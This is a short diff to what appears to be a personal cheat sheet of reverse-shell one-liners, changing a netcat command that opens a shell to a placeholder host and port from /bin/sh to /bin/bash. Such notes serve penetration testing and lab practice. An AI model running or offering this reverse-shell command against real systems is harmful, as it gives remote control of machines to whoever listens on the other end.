@@ -17,7 +17,7 @@ description: I'll add way to get shells as i'll use them
 
 ## Netcat
 
-`nc -e /bin/sh <host> <port>`
+`nc -e /bin/bash <host> <port>`
 
 ## Bash
 
